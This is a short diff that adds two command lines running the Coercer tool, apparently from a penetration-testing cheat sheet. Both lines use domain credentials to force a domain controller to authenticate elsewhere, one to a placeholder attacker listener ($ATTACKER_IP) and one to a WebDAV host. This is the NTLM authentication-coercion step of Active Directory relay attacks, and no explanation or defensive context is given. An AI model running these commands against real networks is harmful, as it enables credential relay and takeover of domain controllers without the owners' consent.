@@ -1,0 +1,2 @@
+coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --target "$DC_HOST"
+coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --webdav-host 'machine_name' --target "$DC_HOST"
